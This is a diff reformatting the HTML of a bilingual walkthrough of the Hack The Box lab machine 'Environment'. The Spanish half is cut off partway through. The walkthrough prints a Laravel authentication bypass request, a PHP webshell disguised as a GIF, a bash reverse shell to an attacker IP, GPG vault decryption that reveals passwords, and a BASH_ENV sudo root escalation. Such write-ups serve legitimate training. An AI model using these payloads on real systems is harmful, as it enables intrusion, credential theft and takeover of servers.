@@ -46,28 +46,48 @@
             <div id="content-en" class="lang-content" style="display:none;">
                 <div class="machine-summary">
                     <h2 data-i18n="summary-title">Exploitation Summary</h2>
-                    <p><strong>Exploitation process:</strong> The target machine was running a Laravel 11.30.0 application in development mode with exposed error messages. By exploiting CVE-2024-52301, a query string environment manipulation vulnerability in Laravel, I was able to bypass authentication by appending <code>?--env=preprod</code> to the login endpoint, which automatically authenticated me as user ID 1 (admin). Once authenticated, I leveraged CVE-2024-21546 in the UniSharp Laravel FileManager component to achieve remote code execution by uploading a PHP webshell disguised as a GIF image with a trailing dot in the filename. After gaining initial access as <code>www-data</code>, I discovered a GPG-encrypted <code>keyvault.gpg</code> file in the <code>hish</code> user's home directory. By copying the user's <code>.gnupg</code> directory to <code>/tmp</code> and decrypting the file, I obtained credentials for the <code>hish</code> user. Finally, I escalated privileges to root by exploiting a sudo misconfiguration that preserved the <code>BASH_ENV</code> environment variable, allowing me to execute arbitrary code as root through a malicious bash script.</p>
-                    <p><strong>Technologies/Exploits:</strong> Laravel environment manipulation (CVE-2024-52301), UniSharp FileManager arbitrary file upload RCE (CVE-2024-21546), GPG key decryption, privileged environment variable abuse via <code>BASH_ENV</code>.</p>
+                    <p><strong>Exploitation process:</strong> The target machine was running a Laravel 11.30.0
+                        application in development mode with exposed error messages. By exploiting CVE-2024-52301, a
+                        query string environment manipulation vulnerability in Laravel, I was able to bypass
+                        authentication by appending <code>?--env=preprod</code> to the login endpoint, which
+                        automatically authenticated me as user ID 1 (admin).</p>
+                    <p>Once authenticated, I leveraged CVE-2024-21546 in the UniSharp Laravel FileManager component to
+                        achieve remote code execution by uploading a PHP webshell disguised as a GIF image with a
+                        trailing dot in the filename. After gaining initial access as <code>www-data</code>, I
+                        discovered a GPG-encrypted <code>keyvault.gpg</code> file in the <code>hish</code> user's home
+                        directory. By copying the user's <code>.gnupg</code> directory to <code>/tmp</code> and
+                        decrypting the file, I obtained credentials for the <code>hish</code> user.</p>
+                    <p>Finally, I escalated privileges to root by exploiting a sudo misconfiguration that preserved the
+                        <code>BASH_ENV</code> environment variable, allowing me to execute arbitrary code as root
+                        through a malicious bash script.</p>
+                    <p><strong>Technologies/Exploits:</strong> Laravel environment manipulation (CVE-2024-52301),
+                        UniSharp FileManager arbitrary file upload RCE (CVE-2024-21546), GPG key decryption, privileged
+                        environment variable abuse via <code>BASH_ENV</code>.</p>
                 </div>
                 <hr class="summary-divider">
-                
+
                 <h2>Initial Reconnaissance</h2>
                 <p>Starting with an nmap scan to identify open ports and services on the target machine:</p>
-                <p><img src="./media/image4.png" alt="Nmap scan results showing open ports SSH on 22 and HTTP on 80" /></p>
-                
-                <p>The scan reveals two open ports: SSH on port 22 and HTTP on port 80. I add <code>environment.htb</code> to my <code>/etc/hosts</code> file to resolve the domain.</p>
-                
+                <p><img src="./media/image4.png" alt="Nmap scan results showing open ports SSH on 22 and HTTP on 80" />
+                </p>
+
+                <p>The scan reveals two open ports: SSH on port 22 and HTTP on port 80. I add
+                    <code>environment.htb</code> to my <code>/etc/hosts</code> file to resolve the domain.</p>
+
                 <h2>Web Enumeration - Laravel Application Discovery</h2>
                 <p>Running <code>whatweb</code> reveals important information about the technology stack:</p>
                 <pre><code class="language-plaintext">http://environment.htb [200 OK] Cookies[XSRF-TOKEN,laravel_session], Country[RESERVED][ZZ], HTML5, HTTPServer[nginx/1.22.1], HttpOnly[laravel_session], IP[10.10.11.67], Laravel, Script, Title[Save the Environment | environment.htb], UncommonHeaders[x-content-type-options], X-Frame-Options[SAMEORIGIN], nginx[1.22.1]</code></pre>
-                
-                <p>The application is running Laravel framework behind nginx 1.22.1. This is particularly interesting as Laravel applications often expose valuable information when running in development mode.</p>
-                
+
+                <p>The application is running Laravel framework behind nginx 1.22.1. This is particularly interesting as
+                    Laravel applications often expose valuable information when running in development mode.</p>
+
                 <p>The main page presents a simple newsletter subscription form:</p>
-                <p><img src="./media/image9.png" alt="Main page showing a newsletter subscription form with email input" /></p>
-                
-                <p>The form processes POST requests and stores email addresses - attempting to submit the same email twice results in an error, indicating some form of backend storage.</p>
-                
+                <p><img src="./media/image9.png"
+                        alt="Main page showing a newsletter subscription form with email input" /></p>
+
+                <p>The form processes POST requests and stores email addresses - attempting to submit the same email
+                    twice results in an error, indicating some form of backend storage.</p>
+
                 <h3>Directory Enumeration</h3>
                 <p>Using <code>feroxbuster</code>, I discover several interesting endpoints:</p>
                 <pre><code class="language-plaintext">200 GET 87l 392w 4602c http://environment.htb/index.php
@@ -77,22 +97,28 @@
 301 GET 7l 11w 169c http://environment.htb/storage => http://environment.htb/storage/
 405 GET 2575l 8675w 244839c http://environment.htb/upload
 200 GET 50l 135w 2126c http://environment.htb/up</code></pre>
-                
+
                 <p>The <code>/login</code> endpoint presents a standard authentication form:</p>
-                <p><img src="./media/image7.png" alt="Login page with email and password fields and a 'Remember Me' checkbox" /></p>
-                
+                <p><img src="./media/image7.png"
+                        alt="Login page with email and password fields and a 'Remember Me' checkbox" /></p>
+
                 <p>The <code>/up</code> endpoint displays minimal content:</p>
                 <p><img src="./media/image10.png" alt="Simple page showing 'Preprod Environment' text" /></p>
-                
-                <p>Attempting to POST directly to <code>/upload</code> redirects me to the login page, confirming authentication is required.</p>
-                
+
+                <p>Attempting to POST directly to <code>/upload</code> redirects me to the login page, confirming
+                    authentication is required.</p>
+
                 <h2>Vulnerability Discovery - Laravel in Development Mode</h2>
                 <p>Intercepting the login POST request with Burp Suite reveals the following body parameters:</p>
                 <pre><code class="language-plaintext">_token=KyZ70D2c778ZWjQGbRohqXDIK3ObfznebUQAaspb&email=asd%40asd.com&password=asd&remember=True</code></pre>
-                
-                <p>By modifying the <code>remember</code> parameter to include a single quote (<code>remember='True</code>), I trigger a detailed error page that reveals critical information:</p>
-                <p><img src="./media/image2.png" alt="Laravel error page showing detailed debug information including framework version, PHP version, and application paths" /></p>
-                
+
+                <p>By modifying the <code>remember</code> parameter to include a single quote
+                    (<code>remember='True</code>), I trigger a detailed error page that reveals critical information:
+                </p>
+                <p><img src="./media/image2.png"
+                        alt="Laravel error page showing detailed debug information including framework version, PHP version, and application paths" />
+                </p>
+
                 <p>This error disclosure provides valuable intelligence:</p>
                 <ul>
                     <li><strong>Laravel version:</strong> 11.30.0</li>
@@ -100,88 +126,105 @@
                     <li><strong>Protected route:</strong> <code>/management/dashboard</code></li>
                     <li><strong>Database:</strong> SQLite</li>
                     <li><strong>Session ID:</strong> <code>g6IYu9pzVVphH9qJXaf1AQ93a0m6AczQhTAbJHzI</code></li>
-                    <li><strong>Critical detail:</strong> In a preprod environment, authentication automatically logs in as user ID 1 (likely an administrator)</li>
+                    <li><strong>Critical detail:</strong> In a preprod environment, authentication automatically logs in
+                        as user ID 1 (likely an administrator)</li>
                 </ul>
-                
+
                 <p>Further enumeration reveals protected management endpoints:</p>
                 <pre><code class="language-plaintext">302 GET 12l 22w 358c http://environment.htb/management/info => http://environment.htb/login
 302 GET 12l 22w 358c http://environment.htb/management/profile => http://environment.htb/login
 302 GET 12l 22w 358c http://environment.htb/management/dashboard => http://environment.htb/login</code></pre>
-                
+
                 <p>Another error message reveals the application uses the UniSharp Laravel FileManager:</p>
                 <pre><code class="language-plaintext">})-&gt;name('unisharp.lfm.upload')-&gt;middleware([AuthMiddleware::class]);</code></pre>
-                
+
                 <h2>Authentication Bypass - CVE-2024-52301</h2>
-                <p>Researching vulnerabilities for Laravel 11.30.0, I discover <a href="https://www.cybersecurity-help.cz/vdb/SB20241112127">CVE-2024-52301</a>, an environment manipulation vulnerability via query strings.</p>
-                
-                <p>According to the <a href="https://github.com/Nyamort/CVE-2024-52301">proof-of-concept repository</a>, this vulnerability allows attackers to manipulate the application environment by appending <code>?--env=&lt;environment&gt;</code> to URLs. Combined with the information from the error message about the preprod environment, I can bypass authentication.</p>
-                
+                <p>Researching vulnerabilities for Laravel 11.30.0, I discover <a
+                        href="https://www.cybersecurity-help.cz/vdb/SB20241112127">CVE-2024-52301</a>, an environment
+                    manipulation vulnerability via query strings.</p>
+
+                <p>According to the <a href="https://github.com/Nyamort/CVE-2024-52301">proof-of-concept repository</a>,
+                    this vulnerability allows attackers to manipulate the application environment by appending
+                    <code>?--env=&lt;environment&gt;</code> to URLs. Combined with the information from the error
+                    message about the preprod environment, I can bypass authentication.</p>
+
                 <p>I modify the login POST request to include the environment parameter:</p>
                 <pre><code class="language-http">POST /login?--env=preprod HTTP/1.1
 Host: environment.htb
 Content-Type: application/x-www-form-urlencoded
 
 _token=KyZ70D2c778ZWjQGbRohqXDIK3ObfznebUQAaspb&email=test@test.com&password=test</code></pre>
-                
+
                 <p>This successfully bypasses authentication and logs me in as the administrator:</p>
-                <p><img src="./media/image8.png" alt="Successful authentication showing dashboard access with user hish@environment.htb" /></p>
-                
+                <p><img src="./media/image8.png"
+                        alt="Successful authentication showing dashboard access with user hish@environment.htb" /></p>
+
                 <p>I note the authenticated user email: <code>hish@environment.htb</code></p>
-                
+
                 <h2>Post-Authentication Enumeration</h2>
-                <p>The management dashboard provides limited functionality, but notably includes a profile picture upload feature. Testing this functionality reveals that uploaded images are stored at:</p>
+                <p>The management dashboard provides limited functionality, but notably includes a profile picture
+                    upload feature. Testing this functionality reveals that uploaded images are stored at:</p>
                 <pre><code class="language-plaintext">http://environment.htb/storage/files/&lt;filename&gt;</code></pre>
-                
+
                 <h2>Remote Code Execution - UniSharp FileManager CVE-2024-21546</h2>
-                <p>Researching vulnerabilities for the UniSharp Laravel FileManager, I discover <a href="https://nvd.nist.gov/vuln/detail/CVE-2024-21546">CVE-2024-21546</a>, an arbitrary file upload vulnerability that allows PHP code execution.</p>
-                
-                <p>According to the <a href="https://github.com/advisories/GHSA-6569-3785-r3v6">GitHub Security Advisory</a>, the vulnerability allows uploading PHP files that will be executed if the filename ends with a trailing dot (<code>.php.</code>).</p>
-                
+                <p>Researching vulnerabilities for the UniSharp Laravel FileManager, I discover <a
+                        href="https://nvd.nist.gov/vuln/detail/CVE-2024-21546">CVE-2024-21546</a>, an arbitrary file
+                    upload vulnerability that allows PHP code execution.</p>
+
+                <p>According to the <a href="https://github.com/advisories/GHSA-6569-3785-r3v6">GitHub Security
+                        Advisory</a>, the vulnerability allows uploading PHP files that will be executed if the filename
+                    ends with a trailing dot (<code>.php.</code>).</p>
+
                 <p>My first attempt to upload a PHP file is rejected:</p>
                 <p><img src="./media/image1.png" alt="Error message showing file upload rejection for PHP file" /></p>
-                
+
                 <p>However, I can bypass the file type validation by prepending GIF magic bytes to the PHP file:</p>
-                <p><img src="./media/image6.png" alt="Modified upload request showing GIF magic bytes prepended to PHP code" /></p>
-                
+                <p><img src="./media/image6.png"
+                        alt="Modified upload request showing GIF magic bytes prepended to PHP code" /></p>
+
                 <p>The payload I upload is a simple PHP webshell:</p>
                 <pre><code class="language-php">GIF89a
 &lt;?php system($_GET['cmd']); ?&gt;</code></pre>
-                
+
                 <p>With the filename: <code>xd.php.</code></p>
-                
+
                 <p>I successfully achieve remote code execution:</p>
-                <p><img src="./media/image5.png" alt="Successful RCE showing command execution output through the uploaded webshell" /></p>
-                
+                <p><img src="./media/image5.png"
+                        alt="Successful RCE showing command execution output through the uploaded webshell" /></p>
+
                 <h3>Obtaining a Reverse Shell</h3>
                 <p>Using the webshell, I execute a bash reverse shell payload:</p>
                 <pre><code class="language-bash">bash -c "bash -i >& /dev/tcp/10.10.16.18/443 0>&1"</code></pre>
-                
+
                 <p>The full URL-encoded request:</p>
                 <pre><code class="language-plaintext">http://environment.htb/storage/files/xd.php?cmd=bash+-c+%22bash+-i+%3E%26+/dev/tcp/10.10.16.18/443+0%3E%261%22</code></pre>
-                
+
                 <p>I receive a connection as the <code>www-data</code> user.</p>
-                
+
                 <h2>Lateral Movement - Discovering Encrypted Credentials</h2>
-                <p>Exploring the filesystem, I discover the user <code>hish</code> in <code>/home</code>. Within the user's home directory, I find:</p>
+                <p>Exploring the filesystem, I discover the user <code>hish</code> in <code>/home</code>. Within the
+                    user's home directory, I find:</p>
                 <ul>
                     <li><code>backup/keyvault.gpg</code> - A GPG-encrypted file</li>
                     <li><code>.gnupg/</code> - A directory containing GPG keyring files</li>
                 </ul>
-                
-                <p>I also examine the Laravel <code>.env</code> file in the project root, but it contains no useful credentials.</p>
-                
+
+                <p>I also examine the Laravel <code>.env</code> file in the project root, but it contains no useful
+                    credentials.</p>
+
                 <p>Checking the SQLite database, I extract the following user hashes:</p>
                 <pre><code class="language-plaintext">hish@environment.htb:$2y$12$QPbeVM.u7VbN9KCeAJ.JA.WfWQVWQg0LopB9ILcC7akZ.q641r1gi
 jono@environment.htb:$2y$12$i.h1rug6NfC73tTb8XF0Y.W0GDBjrY5FBfsyX2wOAXfDWOUk9dphm
 bethany@environment.htb:$2y$12$6kbg21YDMaGrt.iCUkP/s.yLEGAE2S78gWt.6MAODUD3JXFMS13J.</code></pre>
-                
-                <p>These are bcrypt hashes that would take significant time to crack, so I focus on the GPG-encrypted file instead.</p>
-                
+
+                <p>These are bcrypt hashes that would take significant time to crack, so I focus on the GPG-encrypted
+                    file instead.</p>
+
                 <h3>Decrypting the GPG Vault</h3>
                 <p>My first attempt to decrypt the file fails due to permission issues:</p>
                 <pre><code class="language-bash">www-data@environment:~/app$ gpg --decrypt keyvault.gpg
 gpg: Fatal: can't create directory '/var/www/.gnupg': Permission denied</code></pre>
-                
+
                 <p>Attempting to use the user's GPG directory directly also fails:</p>
                 <pre><code class="language-bash">www-data@environment:/home/hish$ gpg --homedir .gnupg/ --decrypt backup/keyvault.gpg
 gpg: WARNING: unsafe ownership on homedir '/home/hish/.gnupg'
@@ -190,24 +233,26 @@ gpg: can't connect to the agent: Permission denied
 gpg: encrypted with 2048-bit RSA key, ID B755B0EDD6CFCFD3, created 2025-01-11
 "hish_ <hish@environment.htb>"
 gpg: decryption failed: No secret key</code></pre>
-                
-                <p>The solution is to copy the entire <code>.gnupg</code> directory to <code>/tmp</code> where I have full permissions:</p>
+
+                <p>The solution is to copy the entire <code>.gnupg</code> directory to <code>/tmp</code> where I have
+                    full permissions:</p>
                 <pre><code class="language-bash">www-data@environment:/home/hish$ cp -r .gnupg/ /tmp/mygpg
 www-data@environment:/home/hish$ cd /tmp
 www-data@environment:/tmp$ chmod -R 700 mygpg/
 www-data@environment:/tmp$ gpg --homedir /tmp/mygpg --decrypt /home/hish/backup/keyvault.gpg</code></pre>
-                
+
                 <p>This successfully decrypts the file, revealing a password vault:</p>
                 <pre><code class="language-plaintext">gpg: encrypted with 2048-bit RSA key, ID B755B0EDD6CFCFD3, created 2025-01-11
 "hish_ <hish@environment.htb>"
 PAYPAL.COM -> Ihaves0meMon$yhere123
 ENVIRONMENT.HTB -> marineSPm@ster!!
 FACEBOOK.COM -> summerSunnyB3ACH!!</code></pre>
-                
-                <p>Using the credentials for <code>ENVIRONMENT.HTB</code>, I successfully switch to the <code>hish</code> user:</p>
+
+                <p>Using the credentials for <code>ENVIRONMENT.HTB</code>, I successfully switch to the
+                    <code>hish</code> user:</p>
                 <pre><code class="language-bash">su hish
 Password: marineSPm@ster!!</code></pre>
-                
+
                 <h2>Privilege Escalation - BASH_ENV Exploitation</h2>
                 <p>Checking sudo privileges for the <code>hish</code> user:</p>
                 <pre><code class="language-bash">hish@environment:~$ sudo -l
@@ -217,54 +262,87 @@ Matching Defaults entries for hish on environment:
 
 User hish may run the following commands on environment:
     (ALL) /usr/bin/systeminfo</code></pre>
-                
-                <p>The key detail here is the <code>env_keep+="ENV BASH_ENV"</code> configuration. This means the <code>ENV</code> and <code>BASH_ENV</code> environment variables are preserved when running commands with sudo.</p>
-                
+
+                <p>The key detail here is the <code>env_keep+="ENV BASH_ENV"</code> configuration. This means the
+                    <code>ENV</code> and <code>BASH_ENV</code> environment variables are preserved when running commands
+                    with sudo.</p>
+
                 <h3>Understanding BASH_ENV</h3>
-                <p>The <code>BASH_ENV</code> environment variable specifies a script that bash will execute before running any command in non-interactive mode. When combined with sudo privileges that preserve this variable, it creates a privilege escalation vector.</p>
-                
-                <p>Examining the <code>systeminfo</code> script reveals it's a simple bash script that executes commands like <code>echo</code>. Since these commands are executed by bash, and <code>BASH_ENV</code> is preserved, I can exploit this to gain root access.</p>
-                
+                <p>The <code>BASH_ENV</code> environment variable specifies a script that bash will execute before
+                    running any command in non-interactive mode. When combined with sudo privileges that preserve this
+                    variable, it creates a privilege escalation vector.</p>
+
+                <p>Examining the <code>systeminfo</code> script reveals it's a simple bash script that executes commands
+                    like <code>echo</code>. Since these commands are executed by bash, and <code>BASH_ENV</code> is
+                    preserved, I can exploit this to gain root access.</p>
+
                 <h3>Exploitation Steps</h3>
                 <p>First, I create a simple script containing <code>/bin/bash</code>:</p>
                 <pre><code class="language-bash">hish@environment:~$ echo '/bin/bash' > /tmp/xd.sh</code></pre>
-                
+
                 <p>Next, I export the <code>BASH_ENV</code> variable pointing to this script:</p>
                 <pre><code class="language-bash">hish@environment:~$ export BASH_ENV=/tmp/xd.sh</code></pre>
-                
-                <p>Finally, I execute <code>systeminfo</code> with sudo. Before bash executes the commands in the <code>systeminfo</code> script, it first executes the script specified in <code>BASH_ENV</code>, which spawns a root shell:</p>
+
+                <p>Finally, I execute <code>systeminfo</code> with sudo. Before bash executes the commands in the
+                    <code>systeminfo</code> script, it first executes the script specified in <code>BASH_ENV</code>,
+                    which spawns a root shell:</p>
                 <pre><code class="language-bash">hish@environment:~$ sudo systeminfo
 root@environment:/home/hish# whoami
 root</code></pre>
-                
+
                 <p>I now have root access and can retrieve the root flag, completing the machine.</p>
             </div>
 
             <div id="content-es" class="lang-content">
                 <div class="machine-summary">
                     <h2 data-i18n="summary-title">Resumen de Explotación</h2>
-                    <p><strong>Resumen del proceso:</strong> La máquina objetivo ejecutaba una aplicación Laravel 11.30.0 en modo desarrollo con mensajes de error expuestos. Explotando CVE-2024-52301, una vulnerabilidad de manipulación de entorno mediante query strings en Laravel, conseguí eludir la autenticación añadiendo <code>?--env=preprod</code> al endpoint de login, lo cual me autenticó automáticamente como el usuario ID 1 (administrador). Una vez autenticado, aproveché CVE-2024-21546 en el componente UniSharp Laravel FileManager para lograr ejecución remota de código subiendo una webshell PHP disfrazada como imagen GIF con un punto al final del nombre de archivo. Tras obtener acceso inicial como <code>www-data</code>, descubrí un archivo cifrado con GPG llamado <code>keyvault.gpg</code> en el directorio home del usuario <code>hish</code>. Copiando el directorio <code>.gnupg</code> del usuario a <code>/tmp</code> y descifrando el archivo, obtuve credenciales para el usuario <code>hish</code>. Finalmente, escalé privilegios a root explotando una mala configuración de sudo que preservaba la variable de entorno <code>BASH_ENV</code>, permitiéndome ejecutar código arbitrario como root mediante un script bash malicioso.</p>
-                    <p><strong>Tecnologías/Exploits:</strong> Manipulación de entorno en Laravel (CVE-2024-52301), RCE mediante subida de archivos arbitrarios en UniSharp FileManager (CVE-2024-21546), descifrado de claves GPG, abuso de variables de entorno privilegiadas mediante <code>BASH_ENV</code>.</p>
+                    <p><strong>Resumen del proceso:</strong> La máquina objetivo ejecutaba una aplicación Laravel
+                        11.30.0 en modo desarrollo con mensajes de error expuestos. Explotando CVE-2024-52301, una
+                        vulnerabilidad de manipulación de entorno mediante query strings en Laravel, conseguí eludir la
+                        autenticación añadiendo <code>?--env=preprod</code> al endpoint de login, lo cual me autenticó
+                        automáticamente como el usuario ID 1 (administrador).</p>
+                    <p>Una vez autenticado, aproveché CVE-2024-21546 en el componente UniSharp Laravel FileManager para
+                        lograr ejecución remota de código subiendo una webshell PHP disfrazada como imagen GIF con un
+                        punto al final del nombre de archivo. Tras obtener acceso inicial como <code>www-data</code>,
+                        descubrí un archivo cifrado con GPG llamado <code>keyvault.gpg</code> en el directorio home del
+                        usuario <code>hish</code>. Copiando el directorio <code>.gnupg</code> del usuario a
+                        <code>/tmp</code> y descifrando el archivo, obtuve credenciales para el usuario
+                        <code>hish</code>.</p>
+                    <p>Finalmente, escalé privilegios a root explotando una mala configuración de sudo que preservaba la
+                        variable de entorno <code>BASH_ENV</code>, permitiéndome ejecutar código arbitrario como root
+                        mediante un script bash malicioso.</p>
+                    <p><strong>Tecnologías/Exploits:</strong> Manipulación de entorno en Laravel (CVE-2024-52301), RCE
+                        mediante subida de archivos arbitrarios en UniSharp FileManager (CVE-2024-21546), descifrado de
+                        claves GPG, abuso de variables de entorno privilegiadas mediante <code>BASH_ENV</code>.</p>
                 </div>
                 <hr class="summary-divider">
-                
+
                 <h2>Reconocimiento Inicial</h2>
-                <p>Comienzo con un escaneo de nmap para identificar puertos abiertos y servicios en la máquina objetivo:</p>
-                <p><img src="./media/image4.png" alt="Resultados del escaneo de nmap mostrando puertos abiertos SSH en el 22 y HTTP en el 80" /></p>
-                
-                <p>El escaneo revela dos puertos abiertos: SSH en el puerto 22 y HTTP en el puerto 80. Añado <code>environment.htb</code> a mi archivo <code>/etc/hosts</code> para resolver el dominio.</p>
-                
+                <p>Comienzo con un escaneo de nmap para identificar puertos abiertos y servicios en la máquina objetivo:
+                </p>
+                <p><img src="./media/image4.png"
+                        alt="Resultados del escaneo de nmap mostrando puertos abiertos SSH en el 22 y HTTP en el 80" />
+                </p>
+
+                <p>El escaneo revela dos puertos abiertos: SSH en el puerto 22 y HTTP en el puerto 80. Añado
+                    <code>environment.htb</code> a mi archivo <code>/etc/hosts</code> para resolver el dominio.</p>
+
                 <h2>Enumeración Web - Descubrimiento de Aplicación Laravel</h2>
                 <p>Ejecutando <code>whatweb</code> revela información importante sobre la pila tecnológica:</p>
                 <pre><code class="language-plaintext">http://environment.htb [200 OK] Cookies[XSRF-TOKEN,laravel_session], Country[RESERVED][ZZ], HTML5, HTTPServer[nginx/1.22.1], HttpOnly[laravel_session], IP[10.10.11.67], Laravel, Script, Title[Save the Environment | environment.htb], UncommonHeaders[x-content-type-options], X-Frame-Options[SAMEORIGIN], nginx[1.22.1]</code></pre>
-                
-                <p>La aplicación ejecuta el framework Laravel detrás de nginx 1.22.1. Esto es particularmente interesante ya que las aplicaciones Laravel a menudo exponen información valiosa cuando se ejecutan en modo desarrollo.</p>
-                
+
+                <p>La aplicación ejecuta el framework Laravel detrás de nginx 1.22.1. Esto es particularmente
+                    interesante ya que las aplicaciones Laravel a menudo exponen información valiosa cuando se ejecutan
+                    en modo desarrollo.</p>
+
                 <p>La página principal presenta un formulario simple de suscripción a newsletter:</p>
-                <p><img src="./media/image9.png" alt="Página principal mostrando un formulario de suscripción a newsletter con campo de email" /></p>
-                
-                <p>El formulario procesa peticiones POST y almacena direcciones de email - intentar enviar el mismo email dos veces resulta en un error, indicando alguna forma de almacenamiento en backend.</p>
-                
+                <p><img src="./media/image9.png"
+                        alt="Página principal mostrando un formulario de suscripción a newsletter con campo de email" />
+                </p>
+
+                <p>El formulario procesa peticiones POST y almacena direcciones de email - intentar enviar el mismo
+                    email dos veces resulta en un error, indicando alguna forma de almacenamiento en backend.</p>
+
                 <h3>Enumeración de Directorios</h3>
                 <p>Usando <code>feroxbuster</code>, descubro varios endpoints interesantes:</p>
                 <pre><code class="language-plaintext">200 GET 87l 392w 4602c http://environment.htb/index.php
@@ -274,22 +352,29 @@ root</code></pre>
 301 GET 7l 11w 169c http://environment.htb/storage => http://environment.htb/storage/
 405 GET 2575l 8675w 244839c http://environment.htb/upload
 200 GET 50l 135w 2126c http://environment.htb/up</code></pre>
-                
+
                 <p>El endpoint <code>/login</code> presenta un formulario de autenticación estándar:</p>
-                <p><img src="./media/image7.png" alt="Página de login con campos de email y contraseña y checkbox 'Recordarme'" /></p>
-                
+                <p><img src="./media/image7.png"
+                        alt="Página de login con campos de email y contraseña y checkbox 'Recordarme'" /></p>
+
                 <p>El endpoint <code>/up</code> muestra contenido mínimo:</p>
                 <p><img src="./media/image10.png" alt="Página simple mostrando texto 'Preprod Environment'" /></p>
-                
-                <p>Intentar hacer POST directamente a <code>/upload</code> me redirige a la página de login, confirmando que se requiere autenticación.</p>
-                
+
+                <p>Intentar hacer POST directamente a <code>/upload</code> me redirige a la página de login, confirmando
+                    que se requiere autenticación.</p>
+
                 <h2>Descubrimiento de Vulnerabilidad - Laravel en Modo Desarrollo</h2>
-                <p>Interceptando la petición POST de login con Burp Suite revela los siguientes parámetros en el body:</p>
+                <p>Interceptando la petición POST de login con Burp Suite revela los siguientes parámetros en el body:
+                </p>
                 <pre><code class="language-plaintext">_token=KyZ70D2c778ZWjQGbRohqXDIK3ObfznebUQAaspb&email=asd%40asd.com&password=asd&remember=True</code></pre>
-                
-                <p>Modificando el parámetro <code>remember</code> para incluir una comilla simple (<code>remember='True</code>), desencadeno una página de error detallada que revela información crítica:</p>
-                <p><img src="./media/image2.png" alt="Página de error de Laravel mostrando información de depuración detallada incluyendo versión del framework, versión de PHP y rutas de la aplicación" /></p>
-                
+
+                <p>Modificando el parámetro <code>remember</code> para incluir una comilla simple
+                    (<code>remember='True</code>), desencadeno una página de error detallada que revela información
+                    crítica:</p>
+                <p><img src="./media/image2.png"
+                        alt="Página de error de Laravel mostrando información de depuración detallada incluyendo versión del framework, versión de PHP y rutas de la aplicación" />
+                </p>
+
                 <p>Esta divulgación de errores proporciona inteligencia valiosa:</p>
                 <ul>
                     <li><strong>Versión de Laravel:</strong> 11.30.0</li>
@@ -297,88 +382,111 @@ root</code></pre>
                     <li><strong>Ruta protegida:</strong> <code>/management/dashboard</code></li>
                     <li><strong>Base de datos:</strong> SQLite</li>
                     <li><strong>ID de sesión:</strong> <code>g6IYu9pzVVphH9qJXaf1AQ93a0m6AczQhTAbJHzI</code></li>
-                    <li><strong>Detalle crítico:</strong> En un entorno preprod, la autenticación automáticamente inicia sesión como usuario ID 1 (probablemente un administrador)</li>
+                    <li><strong>Detalle crítico:</strong> En un entorno preprod, la autenticación automáticamente inicia
+                        sesión como usuario ID 1 (probablemente un administrador)</li>
                 </ul>
-                
+
                 <p>Una enumeración adicional revela endpoints de gestión protegidos:</p>
                 <pre><code class="language-plaintext">302 GET 12l 22w 358c http://environment.htb/management/info => http://environment.htb/login
 302 GET 12l 22w 358c http://environment.htb/management/profile => http://environment.htb/login
 302 GET 12l 22w 358c http://environment.htb/management/dashboard => http://environment.htb/login</code></pre>
-                
+
                 <p>Otro mensaje de error revela que la aplicación usa UniSharp Laravel FileManager:</p>
                 <pre><code class="language-plaintext">})-&gt;name('unisharp.lfm.upload')-&gt;middleware([AuthMiddleware::class]);</code></pre>
-                
+
                 <h2>Elusión de Autenticación - CVE-2024-52301</h2>
-                <p>Investigando vulnerabilidades para Laravel 11.30.0, descubro <a href="https://www.cybersecurity-help.cz/vdb/SB20241112127">CVE-2024-52301</a>, una vulnerabilidad de manipulación de entorno mediante query strings.</p>
-                
-                <p>Según el <a href="https://github.com/Nyamort/CVE-2024-52301">repositorio de prueba de concepto</a>, esta vulnerabilidad permite a los atacantes manipular el entorno de la aplicación añadiendo <code>?--env=&lt;entorno&gt;</code> a las URLs. Combinado con la información del mensaje de error sobre el entorno preprod, puedo eludir la autenticación.</p>
-                
+                <p>Investigando vulnerabilidades para Laravel 11.30.0, descubro <a
+                        href="https://www.cybersecurity-help.cz/vdb/SB20241112127">CVE-2024-52301</a>, una
+                    vulnerabilidad de manipulación de entorno mediante query strings.</p>
+
+                <p>Según el <a href="https://github.com/Nyamort/CVE-2024-52301">repositorio de prueba de concepto</a>,
+                    esta vulnerabilidad permite a los atacantes manipular el entorno de la aplicación añadiendo
+                    <code>?--env=&lt;entorno&gt;</code> a las URLs. Combinado con la información del mensaje de error
+                    sobre el entorno preprod, puedo eludir la autenticación.</p>
+
                 <p>Modifico la petición POST de login para incluir el parámetro de entorno:</p>
                 <pre><code class="language-http">POST /login?--env=preprod HTTP/1.1
 Host: environment.htb
 Content-Type: application/x-www-form-urlencoded
 
 _token=KyZ70D2c778ZWjQGbRohqXDIK3ObfznebUQAaspb&email=test@test.com&password=test</code></pre>
-                
+
                 <p>Esto elude exitosamente la autenticación y me inicia sesión como administrador:</p>
-                <p><img src="./media/image8.png" alt="Autenticación exitosa mostrando acceso al dashboard con usuario hish@environment.htb" /></p>
-                
+                <p><img src="./media/image8.png"
+                        alt="Autenticación exitosa mostrando acceso al dashboard con usuario hish@environment.htb" />
+                </p>
+
                 <p>Anoto el email del usuario autenticado: <code>hish@environment.htb</code></p>
-                
+
                 <h2>Enumeración Post-Autenticación</h2>
-                <p>El panel de gestión proporciona funcionalidad limitada, pero notablemente incluye una característica de subida de foto de perfil. Probando esta funcionalidad revela que las imágenes subidas se almacenan en:</p>
+                <p>El panel de gestión proporciona funcionalidad limitada, pero notablemente incluye una característica
+                    de subida de foto de perfil. Probando esta funcionalidad revela que las imágenes subidas se
+                    almacenan en:</p>
                 <pre><code class="language-plaintext">http://environment.htb/storage/files/&lt;nombre_archivo&gt;</code></pre>
-                
+
                 <h2>Ejecución Remota de Código - UniSharp FileManager CVE-2024-21546</h2>
-                <p>Investigando vulnerabilidades para UniSharp Laravel FileManager, descubro <a href="https://nvd.nist.gov/vuln/detail/CVE-2024-21546">CVE-2024-21546</a>, una vulnerabilidad de subida de archivos arbitrarios que permite la ejecución de código PHP.</p>
-                
-                <p>Según el <a href="https://github.com/advisories/GHSA-6569-3785-r3v6">Aviso de Seguridad de GitHub</a>, la vulnerabilidad permite subir archivos PHP que serán ejecutados si el nombre de archivo termina con un punto (<code>.php.</code>).</p>
-                
+                <p>Investigando vulnerabilidades para UniSharp Laravel FileManager, descubro <a
+                        href="https://nvd.nist.gov/vuln/detail/CVE-2024-21546">CVE-2024-21546</a>, una vulnerabilidad de
+                    subida de archivos arbitrarios que permite la ejecución de código PHP.</p>
+
+                <p>Según el <a href="https://github.com/advisories/GHSA-6569-3785-r3v6">Aviso de Seguridad de
